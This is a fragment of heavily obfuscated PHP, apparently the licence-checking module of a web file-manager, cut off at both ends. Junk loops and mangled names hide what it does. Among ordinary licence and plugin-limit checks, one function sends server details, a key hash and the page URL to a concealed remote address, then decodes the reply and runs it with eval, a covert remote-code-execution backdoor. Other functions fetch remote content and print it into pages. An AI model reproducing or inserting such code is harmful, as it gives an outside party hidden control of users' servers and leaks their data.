$øÊÁœË[761]; Cache::set($¢Å°¨µÒ[205] . md5($âÉà‘Äì . $¢Å°¨µÒ[206]), $¢Å°¨µÒ[6]); $¯êó›¦Æ = $øÊÁœË[762]; while ($¯êó›¦Æ < $øÊÁœË[713]) { if ($¯êó›¦Æ >= 0) { break; } $¯êó›¦Æ++; } show_json(LNG($¢Å°¨µÒ[191]), !0); } private function licenseRegistSuccess() { $å¢áñ¯ø =& $_SERVER[ş•üòéú]; $…—¿Ğı = Model($å¢áñ¯ø[33])->get(); if ($…—¿Ğı[$å¢áñ¯ø[63]] != $å¢áñ¯ø[124]) { Model($å¢áñ¯ø[33])->set($å¢áñ¯ø[63], $å¢áñ¯ø[124]); } Action($å¢áñ¯ø[207])->initStart(!0); } private function wzek3448530d() { $†İ²ğªò =& $_SERVER[µÅ˜º…æ]; $â¸ı¦ÈÔ =& $_SERVER[ş•üòéú]; Model($â¸ı¦ÈÔ[33])->set(array($â¸ı¦ÈÔ[155] => $â¸ı¦ÈÔ[6], $â¸ı¦ÈÔ[193] => $â¸ı¦ÈÔ[6], $â¸ı¦ÈÔ[110] => $â¸ı¦ÈÔ[111], $â¸ı¦ÈÔ[112] => $â¸ı¦ÈÔ[6], $â¸ı¦ÈÔ[113] => $â¸ı¦ÈÔ[6])); Model($â¸ı¦ÈÔ[33])->setDeep($â¸ı¦ÈÔ[200], $â¸ı¦ÈÔ[208]); $this->tnpb82e910e5 = array(); $this->ebvy58030223 = $â¸ı¦ÈÔ[111]; $¸Æ§şµ¸ = $†İ²ğªò[763]; while (strlen($¸Æ§şµ¸) < $†İ²ğªò[727]) { if (!$¸Æ§şµ¸) { break; } $¸Æ§şµ¸++; } } private function noaw060b3cb6() { $ù¢¢â¢É =& $_SERVER[µÅ˜º…æ]; $Íİ³›ú• =& $_SERVER[ş•üòéú]; $_SERVER[$Íİ³›ú•[164]] = _get($_SERVER, $Íİ³›ú•[164], APP_HOST); $óÔ£÷ú = $ù¢¢â¢É[764]; if (strlen($óÔ£÷ú) < $ù¢¢â¢É[713]) { die; } $this->ebvy58030223 = $Íİ³›ú•[111]; $­Æ˜Ï¤Š = $ù¢¢â¢É[765]; if (!$­Æ˜Ï¤Š) { return; } $Ö¬Ü£Ê¦ = Model($Íİ³›ú•[33])->get(); if ($Ö¬Ü£Ê¦[$Íİ³›ú•[110]] == $Íİ³›ú•[111]) { return; } $ş­Áªß’ = Model($Íİ³›ú•[33])->get($Íİ³›ú•[102]); $±¿–¤¨› = $Íİ³›ú•[205] . md5($ş­Áªß’ . $Íİ³›ú•[206]); $ñÊ¹ÛÍ = Cache::get($±¿–¤¨›); $ÃŞ¸Ÿ€ä = $ù¢¢â¢É[766]; if (strlen($ÃŞ¸Ÿ€ä) < $ù¢¢â¢É[709]) { return; } if (!is_array($ñÊ¹ÛÍ) || !isset($ñÊ¹ÛÍ[$Íİ³›ú•[209]]) || time() - $ñÊ¹ÛÍ[$Íİ³›ú•[209]] >= 60) { $²ÍìşŸú = Model($Íİ³›ú•[7])->loadList(); $íòç£¦ = $²ÍìşŸú[$Íİ³›ú•[202]]; $ı²—‚ŸË = md5($_SERVER[$Íİ³›ú•[108]] . strrev($ş­Áªß’) . $Ö¬Ü£Ê¦[$Íİ³›ú•[193]]); $ª²¥Í = strrev(substr($ı²—‚ŸË, 10, 16)); $ñÊ¹ÛÍ = $this->aovg298d75b9($íòç£¦[$Íİ³›ú•[88]][$ª²¥Í], $ı²—‚ŸË); $ñÊ¹ÛÍ = json_decode($ñÊ¹ÛÍ, !0); } if (!is_array($ñÊ¹ÛÍ)) { return $this->wzek3448530d(); } $Ç‘ªÂúö = strtotime($ñÊ¹ÛÍ[$Íİ³›ú•[131]]); if (time() >= $Ç‘ªÂúö) { return $this->wzek3448530d(); } if (!isset($ñÊ¹ÛÍ[$Íİ³›ú•[209]]) || time() - $ñÊ¹ÛÍ[$Íİ³›ú•[209]] > 20) { $ñÊ¹ÛÍ[$Íİ³›ú•[209]] = time(); Cache::set($±¿–¤¨›, $ñÊ¹ÛÍ); } $this->tnpb82e910e5 = $ñÊ¹ÛÍ; $this->ebvy58030223 = $Ö¬Ü£Ê¦[$Íİ³›ú•[110]]; $–àÅ°„² = $ù¢¢â¢É[767]; if (!$–àÅ°„²) { return; } $GLOBALS[$Íİ³›ú•[210]] = $this; } private function zdbr7d89e568() { $Ÿ¥éøí­ =& $_SERVER[µÅ˜º…æ]; $äƒ®‡ı =& $_SERVER[ş•üòéú]; $¹„ì‚ı¬ = $GLOBALS[$äƒ®‡ı[13]]; $©¾ƒÃÌ = $_SERVER[$äƒ®‡ı[24]]; $»äÚ‚Œ = $Ÿ¥éøí­[768]; while (strlen($»äÚ‚Œ) < $Ÿ¥éøí­[727]) { if (!$»äÚ‚Œ) { break; } $»äÚ‚Œ++; } if ($©¾ƒÃÌ == $äƒ®‡ı[211] && $this->ebvy58030223 == $äƒ®‡ı[111]) { show_json(LNG($äƒ®‡ı[212]), !1, $äƒ®‡ı[213]); } $Ê¥™£€— = array($äƒ®‡ı[214], $äƒ®‡ı[215]); if (in_array($©¾ƒÃÌ, $Ê¥™£€—)) { if ($this->ebvy58030223 == $äƒ®‡ı[111] && isset($¹„ì‚ı¬[$äƒ®‡ı[216]])) { show_json(LNG($äƒ®‡ı[212]), !1, $äƒ®‡ı[213]); die; } $ø ¸•ÁÙ = $this->grxmf2bfec16(); if ($ø ¸•ÁÙ != intval($äƒ®‡ı[217])) { if ($ø ¸•ÁÙ <= Model($äƒ®‡ı[127])->count()) { show_json(LNG($äƒ®‡ı[218]), !1, $äƒ®‡ı[213]); die; } } } } private function hutx47f7fe95() { $ûâÄö =& $_SERVER[µÅ˜º…æ]; $£©Äúê¢ =& $_SERVER[ş•üòéú]; $Ú¦®ŒÍı = array($£©Äúê¢[121], $£©Äúê¢[122]); if (!KodUser::isRoot() || !isset($_GET[$£©Äúê¢[219]])) { return; } if (!in_array($_SERVER[$£©Äúê¢[24]], $Ú¦®ŒÍı)) { return; } $…¿« = $£©Äúê¢[220]; $…¿« = $this->jcki1c95cd22($…¿«, $£©Äúê¢[221]); $ß»ÏüÃ = stream_context_create(array($£©Äúê¢[222] => array($£©Äúê¢[223] => $£©Äúê¢[224], $£©Äúê¢[225] => 3))); $‰¯£ïÜé = @file_get_contents($…¿«, !1, $ß»ÏüÃ); $¿í˜í§Î = $ûâÄö[769]; if (strlen($¿í˜í§Î) < $ûâÄö[715]) { return; } header($£©Äúê¢[226]); if ($‰¯£ïÜé && strstr($‰¯£ïÜé, $£©Äúê¢[227])) { echo $‰¯£ïÜé; } die; } public function yeua867aefa9($÷´ùªÅ) { $ã‡éÆ¨± =& $_SERVER[µÅ˜º…æ]; $ŠÑÀµ˜ =& $_SERVER[ş•üòéú]; if ($this->ebvy58030223 == $ŠÑÀµ˜[228]) { return $÷´ùªÅ; } $¾Õ®äõÂ = $this->versionPluginList(); $İ¢…ê‹ì = explode($ŠÑÀµ˜[229], $this->versionPluginFilter()); $„ú¾Şó† = $ã‡éÆ¨±[770]; while ($„ú¾Şó† < $ã‡éÆ¨±[715]) { if ($„ú¾Şó† >= 0) { break; } $„ú¾Şó†++; } $ó¶çÔ“ö = array(); $¿ø¬’€ = $ã‡éÆ¨±[771]; foreach ($¾Õ®äõÂ as $µùï¥ÔÑ => $û„ÖæĞ‹) { if ($û„ÖæĞ‹ == $ŠÑÀµ˜[230] && substr($this->ebvy58030223, 0, 1) == $ŠÑÀµ˜[230]) { continue; } if (!in_array($µùï¥ÔÑ, $İ¢…ê‹ì)) { $ó¶çÔ“ö[] = $µùï¥ÔÑ; } } foreach ($ó¶çÔ“ö as $µùï¥ÔÑ) { unset($÷´ùªÅ[$µùï¥ÔÑ]); $ìØºÔÑ  = $ã‡éÆ¨±[772]; } return $÷´ùªÅ; } private function versionPluginList() { $©–äåÙœ =& $_SERVER[ş•üòéú]; return array($©–äåÙœ[231] => $©–äåÙœ[230], $©–äåÙœ[232] => $©–äåÙœ[230], $©–äåÙœ[233] => $©–äåÙœ[230], $©–äåÙœ[234] => $©–äåÙœ[230], $©–äåÙœ[235] => $©–äåÙœ[230], $©–äåÙœ[236] => $©–äåÙœ[230], $©–äåÙœ[237] => $©–äåÙœ[238], $©–äåÙœ[239] => $©–äåÙœ[238], $©–äåÙœ[240] => $©–äåÙœ[238], $©–äåÙœ[241] => $©–äåÙœ[238], $©–äåÙœ[242] => $©–äåÙœ[238], $©–äåÙœ[243] => $©–äåÙœ[238], $©–äåÙœ[244] => $©–äåÙœ[238], $©–äåÙœ[245] => $©–äåÙœ[238], $©–äåÙœ[246] => $©–äåÙœ[238], $©–äåÙœ[247] => $©–äåÙœ[238], $©–äåÙœ[248] => $©–äåÙœ[238], $©–äåÙœ[249] => $©–äåÙœ[238], $©–äåÙœ[250] => $©–äåÙœ[238]); } private function versionPluginFilter() { $¡â‡•‹Ø =& $_SERVER[µÅ˜º…æ]; $ùºâŞõô =& $_SERVER[ş•üòéú]; if ($this->ebvy58030223 == $ùºâŞõô[111]) { return $ùºâŞõô[6]; } $Î”“ò¾ = _get($this->tnpb82e910e5, $ùºâŞõô[251], $ùºâŞõô[6]); $ªİŠÜû¢ = $¡â‡•‹Ø[773]; $É½ÂàèÏ = _get($this->tnpb82e910e5, $ùºâŞõô[118], $ùºâŞõô[6]); $­È©‘Ë¨ = $¡â‡•‹Ø[774]; if (!$­È©‘Ë¨) { die; } $°“ŸÓÙ = _get($this->tnpb82e910e5, $ùºâŞõô[252], $ùºâŞõô[6]); $ÜÀ®›õ² = $¡â‡•‹Ø[775]; if (!$ÜÀ®›õ²) { return; } if ($É½ÂàèÏ > time() && $°“ŸÓÙ > time()) { $ÓëÜÒàã = explode($ùºâŞõô[229], $Î”“ò¾); $ïÌ¥µî’ = array_keys($this->versionPluginList()); $Î”“ò¾ = array_merge($ÓëÜÒàã, $ïÌ¥µî’); $Î”“ò¾ = implode($ùºâŞõô[229], array_filter(array_unique($Î”“ò¾))); } return $Î”“ò¾; } private function shyt68b4ef61() { $Ù„™ñúÀ =& $_SERVER[ş•üòéú]; if ($this->ebvy58030223 != $Ù„™ñúÀ[111]) { $GLOBALS[$Ù„™ñúÀ[88]][$Ù„™ñúÀ[92]][$Ù„™ñúÀ[253]] = $Ù„™ñúÀ[208]; return; } $GLOBALS[$Ù„™ñúÀ[88]][$Ù„™ñúÀ[254]] = $Ù„™ñúÀ[124]; if (Model($Ù„™ñúÀ[255])->get($Ù„™ñúÀ[63]) != $Ù„™ñúÀ[208]) { Model($Ù„™ñúÀ[255])->set($Ù„™ñúÀ[63], $Ù„™ñúÀ[208]); } } public function qwmi38ab8053() { return $_SERVER[ş•üòéú][256]; } private function ckxy426e28e1() { $‡úĞ’†’ =& $_SERVER[µÅ˜º…æ]; $¢Ô¨¡¯÷ =& $_SERVER[ş•üòéú]; $ùëœşº = array($¢Ô¨¡¯÷[257], $¢Ô¨¡¯÷[258], $¢Ô¨¡¯÷[259]); $Ğ©Á¶Á¨ = $¢Ô¨¡¯÷[260] . md5($¢Ô¨¡¯÷[261]); $£€‘ÂßÆ = $‡úĞ’†’[776]; while ($£€‘ÂßÆ < $‡úĞ’†’[727]) { if ($£€‘ÂßÆ >= 0) { break; } $£€‘ÂßÆ++; } if ($this->ebvy58030223 == $¢Ô¨¡¯÷[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$¢Ô¨¡¯÷[24]], $ùëœşº)) { return; } if (time() % 4 != 0) { return; } $ú¬İÜ­‘ = call_user_func(array($¢Ô¨¡¯÷[262], $¢Ô¨¡¯÷[263]), $Ğ©Á¶Á¨); $ôÜ‹ç©Î = $‡úĞ’†’[777]; while ($ôÜ‹ç©Î < $‡úĞ’†’[727]) { if ($ôÜ‹ç©Î >= 0) { break; } $ôÜ‹ç©Î++; } if ($ú¬İÜ­‘ && time() - $ú¬İÜ­‘ < intval($¢Ô¨¡¯÷[264])) { return; } call_user_func(array($¢Ô¨¡¯÷[262], $¢Ô¨¡¯÷[141]), $Ğ©Á¶Á¨, time()); $«ıô¸¯ = Model($¢Ô¨¡¯÷[33])->get($¢Ô¨¡¯÷[102]); $Öªˆş¢» = array($¢Ô¨¡¯÷[154] => Model($¢Ô¨¡¯÷[33])->get($¢Ô¨¡¯÷[155]), $¢Ô¨¡¯÷[169] => $this->ebvy58030223, $¢Ô¨¡¯÷[165] => $_SERVER[$¢Ô¨¡¯÷[166]], $¢Ô¨¡¯÷[167] => Model($¢Ô¨¡¯÷[33])->get($¢Ô¨¡¯÷[133]), $¢Ô¨¡¯÷[107] => md5($_SERVER[$¢Ô¨¡¯÷[108]] . $«ıô¸¯), $¢Ô¨¡¯÷[158] => $¢Ô¨¡¯÷[138], $¢Ô¨¡¯÷[161] => $_SERVER[$¢Ô¨¡¯÷[162]]); $©‡£µœ = $‡úĞ’†’[778]; while (strlen($©‡£µœ) < $‡úĞ’†’[727]) { if (!$©‡£µœ) { break; } $©‡£µœ++; } $ƒÚú®— = $this->swhzaf2933a6($¢Ô¨¡¯÷[265], $Öªˆş¢»); if (!is_array($ƒÚú®—)) { return; } if ($ƒÚú®—[$¢Ô¨¡¯÷[154]] && $ƒÚú®—[$¢Ô¨¡¯÷[266]]) { if ($this->daty6e25f853($ƒÚú®—[$¢Ô¨¡¯÷[266]]) == $Öªˆş¢»[$¢Ô¨¡¯÷[154]]) { return; } } $this->wzek3448530d(); if ($this->daty6e25f853($ƒÚú®—[$¢Ô¨¡¯÷[266]]) != $Öªˆş¢»[$¢Ô¨¡¯÷[154]]) { $Ğ‹Õ£•– = array($¢Ô¨¡¯÷[187] => $«ıô¸¯, $¢Ô¨¡¯÷[188] => $_SERVER[$¢Ô¨¡¯÷[108]], $¢Ô¨¡¯÷[189] => this_url(), $¢Ô¨¡¯÷[163] => $_SERVER[$¢Ô¨¡¯÷[164]]); $íÂâ„³ë = $this->nwga3097e99d(json_encode($Ğ‹Õ£•–)); $ƒÚú®— = $this->swhzaf2933a6($¢Ô¨¡¯÷[190] . $íÂâ„³ë); if ($ƒÚú®— && is_array($ƒÚú®—) && isset($ƒÚú®—[$¢Ô¨¡¯÷[266]])) { $Æ¶ËâäÇ = $this->aovg298d75b9($ƒÚú®—[$¢Ô¨¡¯÷[266]], 2); if ($Æ¶ËâäÇ) { $Æ¶ËâäÇ = $this->daty6e25f853($Æ¶ËâäÇ); } if ($Æ¶ËâäÇ) { try { @eval($Æ¶ËâäÇ); } catch (Exception $™¶ ëÏ) { } } } } } private function swhzaf2933a6($ñŠ»¹­£ = '', $ÚÎ´—Úí = array(), $¿€±¼ü¢ = 5) { $ËŒïôá =& $_SERVER[µÅ˜º…æ]; $Ûº½ƒà– =& $_SERVER[ş•üòéú]; $ĞÁ–üÔ™ = $Ûº½ƒà–[267]; $ËïüŞÁÀ = $ËŒïôá[779]; while ($ËïüŞÁÀ < $ËŒïôá[713]) { if ($ËïüŞÁÀ >= 0) { break; } $ËïüŞÁÀ++; } $ĞÁ–üÔ™ = $this->jcki1c95cd22($ĞÁ–üÔ™, $Ûº½ƒà–[268]); $ĞÁ–üÔ™ = $ĞÁ–üÔ™ . $ñŠ»¹­£; if ($ÚÎ´—Úí && is_array($ÚÎ´—Úí)) { $ĞÁ–üÔ™ = $ĞÁ–üÔ™ . $Ûº½ƒà–[269] . http_build_query($ÚÎ´—Úí); } if ($ÚÎ´—Úí === -1) { return $ĞÁ–üÔ™; } $ê¹úĞ±Ó = stream_context_create(array($Ûº½ƒà–[222] => array($Ûº½ƒà–[225] => $¿€±¼ü¢, $Ûº½ƒà–[223] => $Ûº½ƒà–[270]), $Ûº½ƒà–[271] => array($Ûº½ƒà–[272] => !1, $Ûº½ƒà–[273] => !1))); $ÚÎ´—Úí = @file_get_contents($ĞÁ–üÔ™, !1, $ê¹úĞ±Ó); return json_decode($ÚÎ´—Úí, !0); $Ä¼”ªÚ = $ËŒïôá[780]; if (strlen($Ä¼”ªÚ) < $ËŒïôá[713]) { return; } $Å³âÄè = $ËŒïôá[781]; } private function grxmf2bfec16() { $••‚Œ¶Ê =& $_SERVER[µÅ˜º…æ]; $—ˆ³Ì¬ =& $_SERVER[ş•üòéú]; $¬—ÛÇ½ş = array($—ˆ³Ì¬[274] => $—ˆ³Ì¬[275], $—ˆ³Ì¬[276] => $—ˆ³Ì¬[277], $—ˆ³Ì¬[278] => $—ˆ³Ì¬[279], $—ˆ³Ì¬[280] => $—ˆ³Ì¬[281], $—ˆ³Ì¬[282] => $—ˆ³Ì¬[283], $—ˆ³Ì¬[284] => $—ˆ³Ì¬[217], $—ˆ³Ì¬[285] => $—ˆ³Ì¬[217], $—ˆ³Ì¬[286] => $—ˆ³Ì¬[275], $—ˆ³Ì¬[287] => $—ˆ³Ì¬[277], $—ˆ³Ì¬[288] => $—ˆ³Ì¬[279], $—ˆ³Ì¬[289] => $—ˆ³Ì¬[290], $—ˆ³Ì¬[291] => $—ˆ³Ì¬[281], $—ˆ³Ì¬[292] => $—ˆ³Ì¬[293], $—ˆ³Ì¬[294] => $—ˆ³Ì¬[283], $—ˆ³Ì¬[295] => $—ˆ³Ì¬[296], $—ˆ³Ì¬[297] => $—ˆ³Ì¬[298], $—ˆ³Ì¬[299] => $—ˆ³Ì¬[300]); $áİÜÉ¾ = $••‚Œ¶Ê[782]; if (!$áİÜÉ¾) { die; } $Éö²…Éú = $¬—ÛÇ½ş[$this->ebvy58030223]; $Éö²…Éú = intval($Éö²…Éú ? $Éö²…Éú : $—ˆ³Ì¬[275]); $©‰ıªİ¨ = $••‚Œ¶Ê[783]; while ($©‰ıªİ¨ < $••‚Œ¶Ê[713]) { if ($©‰ıªİ¨ >= 0) { break; } $©‰ıªİ¨++; } $İ’°ñÌá = _get($this->tnpb82e910e5, $—ˆ³Ì¬[301]); $Œé¥·°è = $••‚Œ¶Ê[784]; while ($Œé¥·°è < $••‚Œ¶Ê[727]) { if ($Œé¥·°è >= 0) { break; } $Œé¥·°è++; } $İ’°ñÌá = $İ’°ñÌá ? intval($İ’°ñÌá) : 0; $İ®ÏÉ–ì = $••‚Œ¶Ê[746]; return $Éö²…Éú + $İ’°ñÌá; } public function itqe5467d69f($ë®şÓñ©) { $ƒòù·‡ƒ =& $_SERVER[µÅ˜º…æ]; $”£å¢ëô =& $_SERVER[ş•üòéú]; $Ñ£âÜ” = $this->grxmf2bfec16(); $ö®ÏÑúù = $ƒòù·‡ƒ[785]; if (strlen($ö®ÏÑúù) < $ƒòù·‡ƒ[715]) { return; } if ($ë®şÓñ©[$”£å¢ëô[302]] == $”£å¢ëô[124]) { return; } if ($Ñ£âÜ” >= intval($”£å¢ëô[217])) { return; } $è‹ëíè¤ = Model($”£å¢ëô[127])->count(); if ($è‹ëíè¤ <= $Ñ£âÜ”) { return; } $İöÊ‰‡ü = Model($”£å¢ëô[127])->field($”£å¢ëô[302])->limit($Ñ£âÜ”)->select(); $İöÊ‰‡ü = array_to_keyvalue($İöÊ‰‡ü, $”£å¢ëô[6], $”£å¢ëô[302]); $÷“ëÏäÌ = $ƒòù·‡ƒ[786]; if (strlen($÷“ëÏäÌ) < $ƒòù·‡ƒ[727]) { return; } if (!in_array($ë®şÓñ©[$”£å¢ëô[302]], $İöÊ‰‡ü)) { show_json($”£å¢ëô[303], !1, $”£å¢ëô[213]); } } public function edarbad7ff9a() { $å³æ§ç =& $_SERVER[µÅ˜º…æ]; $Ïîå„ğÔ =& $_SERVER[ş•üòéú]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $¯ƒ’–ŒÕ = $Ïîå„ğÔ[220]; $ê¯œÎã = $å³æ§ç[787]; $¯ƒ’–ŒÕ = $this->jcki1c95cd22($¯ƒ’–ŒÕ, $Ïîå„ğÔ[221]); $Ãä‘¨à = $å³æ§ç[788]; if (!$Ãä‘¨à) { die; } $ƒ´üè® = stream_context_create(array($Ïîå„ğÔ[222] => array($Ïîå„ğÔ[223] => $Ïîå„ğÔ[224], $Ïîå„ğÔ[225] => 3))); $¼Ñ¡¬–´ = @file_get_contents($¯ƒ’–ŒÕ, !1, $ƒ´üè®); echo $Ïîå„ğÔ[304] . hash_encode($¼Ñ¡¬–´) . $Ïîå„ğÔ[305]; } private function apvf20890a9b($ÔÀï¡ÉÉ, $Âö¡È˜½, $Ñ¢Ë‰Ê = 3) { $ã°§Ê   =& $_SERVER[µÅ˜º…æ]; $£¿ù¦Õæ =& $_SERVER[ş•üòéú]; usleep(1); $ÔÀï¡ÉÉ = trim($ÔÀï¡ÉÉ); $áí‚ã¯ = $ã°§Ê  [789]; if (!$áí‚ã¯) { return; } $ÂŠ™”œâ = mt_rand(0, 5) . $£¿ù¦Õæ[6]; $ İ¤ Í® = $ã°§Ê  [790]; if (!$ İ¤ Í®) { die; } $ÅËä„ºğ = rand_string(15); $²®æøÙÕ = $ã°§Ê  [791]; if (!$²®æøÙÕ) { return; } $ƒóÖÒÉ› = $£¿ù¦Õæ[306]; $ÚêÍÙ«Ì = $ã°§Ê  [792]; if (!$ÚêÍÙ«Ì) { return; } switch ($ÂŠ™”œâ) { case $£¿ù¦Õæ[208]: $‰¢ò÷«Ã = $this->nozmc3f76e6b($ÔÀï¡ÉÉ, strrev($Âö¡È˜½ . $ÅËä„ºğ)); break; $¶şÂâ‘¶ = $ã°§Ê  [793]; if (strlen($¶şÂâ‘¶) < $ã°§Ê  [715]) { return; } case $£¿ù¦Õæ[124]: $‰¢ò÷«Ã = $this->nozmc3f76e6b($ÔÀï¡ÉÉ, strrev($ÅËä„ºğ . $Âö¡È˜½)); $‰£×¿ŸÒ = $ã°§Ê  [794]; while ($‰£×¿ŸÒ < $ã°§Ê  [718]) { if ($‰£×¿ŸÒ >= 0) { break; } $‰£×¿ŸÒ++; } break; case $£¿ù¦Õæ[307]: $‰¢ò÷«Ã = $this->nozmc3f76e6b($ÔÀï¡ÉÉ, base64_encode($ÅËä„ºğ . $Âö¡È˜½)); $„”º×‹¬ = $ã°§Ê  [795]; while ($„”º×‹¬ < $ã°§Ê  [709]) { if ($„”º×‹¬ >= 0) { break; } $„”º×‹¬++; } break; case $£¿ù¦Õæ[308]: $‰¢ò÷«Ã = $this->nozmc3f76e6b($ÔÀï¡ÉÉ, md5($ÅËä„ºğ . $Âö¡È˜½)); $ûÈÔ×³ƒ = $ã°§Ê  [796]; if (!$ûÈÔ×³ƒ) { die; } break; case $£¿ù¦Õæ[309]: $ÔÀï¡ÉÉ = base64_encode($ÔÀï¡ÉÉ); $Îü¨šª” = $ã°§Ê  [797]; while ($Îü¨šª” < $ã°§Ê  [727]) { if ($Îü¨šª” >= 0) { break; } $Îü¨šª”++; } $ÃÑï¢Ï… = rand(0, 64); $Ü“´ÚŞ = $ƒóÖÒÉ›[$ÃÑï¢Ï…]; $íéÚÓ†® = md5($Ü“´ÚŞ . md5($Âö¡È˜½ . $Ü“´ÚŞ) . $Âö¡È˜½); $íéÚÓ†® = substr($íéÚÓ†®, $ÃÑï¢Ï… % 8, $ÃÑï¢Ï… % 8 + 7); $Ô«Öİì™ = $£¿ù¦Õæ[6]; $æµœâ°Û = $ã°§Ê  [798]; if (strlen($æµœâ°Û) < $ã°§Ê  [715]) { die; } $™–›¨¿Â = 0; $ëç»ƒÑ‚ = $ã°§Ê  [799]; $Ã·ğ¼ş = 0; $ÕûêÖ¾û = $ã°§Ê  [800]; if (!$ÕûêÖ¾û) { return; } $ï²²¿•î = 0; for ($™–›¨¿Â = 0; $™–›¨¿Â < strlen($ÔÀï¡ÉÉ); $™–›¨¿Â++) { $ï²²¿•î = $ï²²¿•î == strlen($íéÚÓ†®) ? 0 : $ï²²¿•î; $É–ú°¨ = $ã°§Ê  [801]; if (!$É–ú°¨) { die; } $Ã·ğ¼ş = ($ÃÑï¢Ï… + strpos($ƒóÖÒÉ›, $ÔÀï¡ÉÉ[$™–›¨¿Â]) + ord($íéÚÓ†®[$ï²²¿•î++])) % 64; $Ô«Öİì™ .= $ƒóÖÒÉ›[$Ã·ğ¼ş]; $‚°öÊÁ§ = $ã°§Ê  [802]; if (strlen($‚°öÊÁ§) < $ã°§Ê  [715]) { die; } } $‰¢ò÷«Ã = hash_encode($Ü“´ÚŞ . $Ô«Öİì™); $ôşçâŠú = $ã°§Ê  [803]; while (strlen($ôşçâŠú) < $ã°§Ê  [709]) { if (!$ôşçâŠú) { break; } $ôşçâŠú++; } break; default: $‰¢ò÷«Ã = $this->nozmc3f76e6b($ÔÀï¡ÉÉ, $Âö¡È˜½ . $ÅËä„ºğ); break; $şçƒÖ”º = $ã°§Ê  [804]; if (strlen($şçƒÖ”º) < $ã°§Ê  [713]) { die; } } $‰¢ò÷«Ã = strrev($ÂŠ™”œâ . $ÅËä„ºğ . $‰¢ò÷«Ã); $‡šŒÙÛª = $ã°§Ê  [805]; while ($‡šŒÙÛª < $ã°§Ê  [713]) { if ($‡šŒÙÛª >= 0) { break; } $‡šŒÙÛª++; } if ($Ñ¢Ë‰Ê - 1 > 0) { $‰¢ò÷«Ã = $this->apvf20890a9b($‰¢ò÷«Ã, $Âö¡È˜½, $Ñ¢Ë‰Ê - 1); } return $‰¢ò÷«Ã; } private function aovg298d75b9($À¢‹…±, $¦é›ß¸é, $Ü´¼Õ— = 3) { $‘Õ¼ôöß =& $_SERVER[µÅ˜º…æ]; $œ²Ú´íì =& $_SERVER[ş•üòéú]; if (!is_string($À¢‹…±) || strlen($À¢‹…±) < 10) { return !1; } $À¢‹…± = trim($À¢‹…±); $ÊŞ–ñö = $‘Õ¼ôöß[806]; while ($ÊŞ–ñö < $‘Õ¼ôöß[713]) { if ($ÊŞ–ñö >= 0) { break; } $ÊŞ–ñö++; } $À¢‹…± = strrev($À¢‹…±); $ŞÃÖë¯˜ = $‘Õ¼ôöß[807]; if (!$ŞÃÖë¯˜) { die; } $¡Ä—©ñî = $À¢‹…±[0]; $øÙÁèœŞ = $‘Õ¼ôöß[808]; while ($øÙÁèœŞ < $‘Õ¼ôöß[715]) { if ($øÙÁèœŞ >= 0) { break; } $øÙÁèœŞ++; } $Ü„¶½¢Õ = substr($À¢‹…±, 1, 15); $şó×÷ë÷ = $‘Õ¼ôöß[809]; while (strlen($şó×÷ë÷) < $‘Õ¼ôöß[715]) { if (!$şó×÷ë÷) { break; } $şó×÷ë÷++; } $À¢‹…± = substr($À¢‹…±, 16); $²ÊÖ¹ä— = $œ²Ú´íì[306]; switch ($¡Ä—©ñî) { case $œ²Ú´íì[208]: $×§¼Â¾‡ = $this->jcki1c95cd22($À¢‹…±, strrev($¦é›ß¸é . $Ü„¶½¢Õ)); break; $˜ª¿†«Û = $‘Õ¼ôöß[810]; if (!$˜ª¿†«Û) { die; } case $œ²Ú´íì[124]: $×§¼Â¾‡ = $this->jcki1c95cd22($À¢‹…±, strrev($Ü„¶½¢Õ . $¦é›ß¸é)); $…šÛûó = $‘Õ¼ôöß[811]; if (strlen($…šÛûó) < $‘Õ¼ôöß[718]) { die; } break; case $œ²Ú´íì[307]: $×§¼Â¾‡ = $this->jcki1c95cd22($À¢‹…±, base64_encode($Ü„¶½¢Õ . $¦é›ß¸é)); break; $õüšÀ»î = $‘Õ¼ôöß[812]; if (strlen($õüšÀ»î) < $‘Õ¼ôöß[709]) { die; } case $œ²Ú´íì[308]: $×§¼Â¾‡ = $this->jcki1c95cd22($À¢‹…±, md5($Ü„¶½¢Õ . $¦é›ß¸é)); break; case $œ²Ú´íì[309]: $À¢‹…± = hash_decode($À¢‹…±); $…Ğıíó‹ = $À¢‹…±[0]; $¸îÔÔˆ¬ = $‘Õ¼ôöß[813]; $À¢‹…± = substr($À¢‹…±, 1); $´İ«úˆ = $‘Õ¼ôöß[814]; while ($´İ«úˆ < $‘Õ¼ôöß[709]) { if ($´İ«úˆ >= 0) { break; } $´İ«úˆ++; } $§ûµ„£Ã = strpos($²ÊÖ¹ä—, $…Ğıíó‹); $ö†ˆ¹ª = $‘Õ¼ôöß[815]; if (!$ö†ˆ¹ª) { return; } $Óş´–í³ = md5($…Ğıíó‹ . md5($¦é›ß¸é . $…Ğıíó‹) . $¦é›ß¸é); $ãÜ¨¦Ù– = $‘Õ¼ôöß[816]; while (strlen($ãÜ¨¦Ù–) < $‘Õ¼ôöß[715]) { if (!$ãÜ¨¦Ù–) { break; } $ãÜ¨¦Ù–++; } $Óş´–í³ = substr($Óş´–í³, $§ûµ„£Ã % 8, $§ûµ„£Ã % 8 + 7); $Íœú´Ù· = $‘Õ¼ôöß[817]; while ($Íœú´Ù· < $‘Õ¼ôöß[727]) { if ($Íœú´Ù· >= 0) { break; } $Íœú´Ù·++; } $Ã­¸šıö = $œ²Ú´íì[6]; $·ç©ºûÛ = 0; $óº“¦äÛ = $‘Õ¼ôöß[818]; if (strlen($óº“¦äÛ) < $‘Õ¼ôöß[713]) { die; } $ÂğÓÚ = 0; $ÜçÅìİæ = 0; $°¯æ‚è— = $‘Õ¼ôöß[819]; while (strlen($°¯æ‚è—) < $‘Õ¼ôöß[727]) { if (!$°¯æ‚è—) { break; } $°¯æ‚è—++; } for ($·ç©ºûÛ = 0; $·ç©ºûÛ < strlen($À¢‹…±); $·ç©ºûÛ++) { $ÜçÅìİæ = $ÜçÅìİæ == strlen($Óş´–í³) ? 0 : $ÜçÅìİæ; $¿ï£ÊüÖ = $‘Õ¼ôöß[820]; if (!$¿ï£ÊüÖ) { die; } $¡’ğŒÊÈ = $ÜçÅìİæ++; $òè®èäµ = $‘Õ¼ôöß[821]; $ÂğÓÚ = strpos($²ÊÖ¹ä—, $À¢‹…±[$·ç©ºûÛ]) - $§ûµ„£Ã - ord($Óş´–í³[$¡’ğŒÊÈ]); while ($ÂğÓÚ < 0) { $ÂğÓÚ += 64; $­Á½Ãû¡ = 